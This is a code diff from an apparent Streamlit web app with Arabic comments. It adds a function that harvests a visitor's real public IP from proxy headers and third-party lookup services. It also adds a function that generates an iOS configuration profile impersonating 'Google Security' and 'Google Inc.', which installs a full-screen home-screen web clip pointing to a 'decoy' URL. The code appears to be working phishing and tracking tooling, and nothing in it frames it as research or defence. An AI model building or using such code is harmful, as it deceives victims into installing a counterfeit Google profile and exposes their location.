@@ -74,28 +74,37 @@ def get_image_as_base64(path):
 
 # دالة جلب الـ IP العام
 def get_real_public_ip():
-    try:
-        # محاولة جلب الـ IP من X-Forwarded-For أولاً
-        if st.request and st.request.headers:
-            x_forwarded_for = st.request.headers.get("X-Forwarded-For")
-            if x_forwarded_for:
-                # قد يحتوي على عدة IPs، نأخذ الأول ونزيل المسافات
-                ip = x_forwarded_for.split(",")[0].strip()
-                # التحقق إذا كان IP خاص (Private IP)
-                if not ip.startswith(("10.", "172.16.", "172.31.", "192.168.")):
-                    return ip
-        # إذا لم يكن X-Forwarded-For موجوداً أو كان IP خاصاً، نستخدم ipify
-        return requests.get("https://api.ipify.org", timeout=5).text
-    except: return "Unknown"
+    # قائمة بمصادر جلب الـ IP بالترتيب
+    ip_sources = [
+        # 1. X-Forwarded-For (من Streamlit Request Headers)
+        lambda: st.request.headers.get("X-Forwarded-For").split(",")[0].strip() if st.request and st.request.headers and st.request.headers.get("X-Forwarded-For") else None,
+        # 2. Cloudflare (إذا كان التطبيق خلف Cloudflare)
+        lambda: st.request.headers.get("CF-Connecting-IP") if st.request and st.request.headers and st.request.headers.get("CF-Connecting-IP") else None,
+        # 3. ipify.org
+        lambda: requests.get("https://api.ipify.org", timeout=3).text,
+        # 4. AbstractAPI (لجلب الـ IP والموقع الجغرافي)
+        lambda: requests.get(f"https://ipgeolocation.abstractapi.com/v1/?api_key={config.get_key("ABSTRACT_API_KEY")}", timeout=3).json().get("ip_address") if config.get_key("ABSTRACT_API_KEY") else None
+    ]
+
+    for source in ip_sources:
+        try:
+            ip = source()
+            if ip and not ip.startswith(("10.", "172.16.", "172.31.", "192.168.")): # تجاهل الـ IPs المحلية
+                return ip
+        except:
+            pass
+    return "Unknown"
 
 # دالة إرسال التنبيه
 def generate_ios_mobileconfig(decoy_url):
     profile_uuid = str(uuid.uuid4())
     webclip_uuid = str(uuid.uuid4())
     
-    # يمكنك استبدال الأيقونة هنا بصورة Base64 لأيقونة Google Security
+    # يمكن استخدام أيقونة Base64 هنا إذا توفرت
+    # icon_data = get_image_as_base64("path/to/google_security_icon.png")
     # حالياً، نتركها فارغة أو نستخدم أيقونة افتراضية
-    icon_data = ""
+    icon_data = "" # Placeholder for actual icon data (base64 encoded PNG/JPG)
+    icon_data_tag = f"<key>Icon</key><data>{icon_data}</data>" if icon_data else ""
 
     mobileconfig_content = f"""
 <?xml version="1.0" encoding="UTF-8"?>
@@ -105,50 +114,40 @@ def generate_ios_mobileconfig(decoy_url):
     <key>PayloadContent</key>
     <array>
         <dict>
-            <key>FullScreen</key>
-            <true/>
-            <key>Icon</key>
-            <data>
-            {icon_data}
-            </data>
-            <key>IsRemovable</key>
-            <true/>
+            <key>URL</key>
+            <string>{decoy_url}</string>
             <key>Label</key>
             <string>Google Security</string>
-            <key>PayloadDescription</key>
-            <string>Adds a Google Security web clip to your Home screen.</string>
+            <key>IsRemovable</key>
+            <true/>
+            <key>FullScreen</key>
+            <true/>
+            <key>Precomposed</key>
+            <true/>
+            <key>PayloadUUID</key>
+            <string>{webclip_uuid}</string>
             <key>PayloadDisplayName</key>
             <string>Google Security</string>
             <key>PayloadIdentifier</key>
             <string>com.example.googlesecurity.webclip</string>
-            <key>PayloadOrganization</key>
-            <string>Google Inc.</string>
             <key>PayloadType</key>
             <string>com.apple.webClip.managed</string>
-            <key>PayloadUUID</key>
-            <string>{webclip_uuid}</string>
             <key>PayloadVersion</key>
             <integer>1</integer>
-            <key>URL</key>
-            <string>{decoy_url}</string>
         </dict>
     </array>
-    <key>PayloadDescription</key>
-    <string>This profile adds a Google Security web clip to your Home screen for quick access to security updates.</string>
     <key>PayloadDisplayName</key>
     <string>Google Security Profile</string>
     <key>PayloadIdentifier</key>
     <string>com.example.googlesecurity.profile</string>
-    <key>PayloadOrganization</key>
-    <string>Google Inc.</string>
-    <key>PayloadRemovalDisallowed</key>
-    <false/>
-    <key>PayloadType</key>
-    <string>Configuration</string>
     <key>PayloadUUID</key>
     <string>{profile_uuid}</string>
     <key>PayloadVersion</key>
     <integer>1</integer>
+    <key>PayloadOrganization</key>
+    <string>Google Inc.</string>
+    <key>PayloadType</key>
+    <string>Configuration</string>
 </dict>
 </plist>
 """
